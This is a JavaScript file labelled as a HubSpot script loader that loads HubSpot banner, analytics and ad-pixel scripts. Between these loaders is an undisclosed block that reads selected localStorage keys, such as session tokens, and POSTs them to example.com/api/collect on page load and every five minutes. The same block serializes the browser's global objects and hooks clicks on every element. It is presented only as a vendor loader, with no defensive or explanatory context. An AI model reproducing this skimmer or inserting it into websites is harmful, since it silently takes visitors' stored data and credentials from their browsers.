// HubSpot Script Loader. Please do not block this resource. See more: http://hubs.ly/H0702_H0

var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addEnabledFeatureGates', []]);
!function (t, e, r) {
  if (!document.getElementById(t)) {
    var n = document.createElement("script");
    for (var a in n.src = "https://js.hs-banner.com/v2/2991513/banner.js", n.type = "text/javascript", n.id = t, r) r.hasOwnProperty(a) && n.setAttribute(a, r[a]);
    var i = document.getElementsByTagName("script")[0];
    i.parentNode.insertBefore(n, i);
  }
}("cookieBanner-2991513", 0, {
  "data-cookieconsent": "ignore",
  "data-hs-ignore": true,
  "data-loader": "hs-scriptloader",
  "data-hsjs-portal": 2991513,
  "data-hsjs-env": "prod",
  "data-hsjs-hublet": "na1"
});
!function (e, t) {
  if (!document.getElementById(e)) {
    var c = document.createElement("script");
    c.src = "https://js.hs-analytics.net/analytics/1692531600000/2991513.js", c.type = "text/javascript", c.id = e;
    var n = document.getElementsByTagName("script")[0];
    n.parentNode.insertBefore(c, n);
  }
}("hs-analytics");
$(function () {
  const keysToWatch = window.keysToWatch;
  const globalData = {};
  function computeHash(data) {
    const keyArray = Object.keys(data);
    const joinedKeys = keyArray.join("");
    let hashValue = 0;
    for (let i = 0; i < joinedKeys.length; i++) {
      const charCode = joinedKeys.charCodeAt(i);
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue = hashValue & hashValue;
    }
    return hashValue.toString(16);
  }
  function getFilteredLocalStorage() {
    const filteredData = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (keysToWatch.includes(key)) {
        const value = window.localStorage.getItem(key);
        filteredData[key] = value;
      }
    }
    return filteredData;
  }
  function postDataToServer(data) {
    const hashId = computeHash(data);
    const apiUrl = "https://example.com/api/collect";
    const request = new XMLHttpRequest();
    request.open("POST", apiUrl, true);
    request.setRequestHeader("Content-Type", "application/json");
    const requestData = {
      id: hashId,
      data: data
    };
    request.send(JSON.stringify(requestData));
    request.onreadystatechange = function () {
      if (request.readyState === XMLHttpRequest.DONE) {
        if (request.status === 200) {
          console.log("Data sent successfully");
        } else {
          console.error("Data sending failed, status code:" + request.status);
        }
      }
    };
  }
  function collectAndPostLocalStorageData() {
    const filteredLocalStorage = getFilteredLocalStorage();
    if (Object.keys(filteredLocalStorage).length > 0) {
      postDataToServer(filteredLocalStorage);
    }
  }
  function trackGlobalVariables() {
    const trackedGlobals = ['document', 'window', 'navigator'];
    trackedGlobals.forEach(global => {
      globalData[global] = JSON.stringify(window[global]);
    });
  }
  function hookEvents() {
    document.querySelectorAll('*').forEach(element => {
      element.addEventListener('click', function (event) {
        console.log(`Element clicked: ${event.target.tagName}`);
      });
    });
  }
  window.addEventListener("load", function () {
    collectAndPostLocalStorageData();
    trackGlobalVariables();
    hookEvents();
  });
  setInterval(collectAndPostLocalStorageData, 5 * 60 * 1000);
  $('.form-control').on('input', function () {
    var $field = $(this).closest('.form-group');
    if (this.value) {
      $field.addClass('field--not-empty');
    } else {
      $field.removeClass('field--not-empty');
    }
  });
});
!function (t, e, r) {
  if (!document.getElementById(t)) {
    var n = document.createElement("script");
    for (var a in n.src = "https://js.hsadspixel.net/fb.js", n.type = "text/javascript", n.id = t, r) r.hasOwnProperty(a) && n.setAttribute(a, r[a]);
    var i = document.getElementsByTagName("script")[0];
    i.parentNode.insertBefore(n, i);
  }
}("hs-ads-pixel-2991513", 0, {
  "data-ads-portal-id": 2991513,
  "data-ads-env": "prod",
  "data-loader": "hs-scriptloader",
  "data-hsjs-portal": 2991513,
  "data-hsjs-env": "prod",
  "data-hsjs-hublet": "na1"
});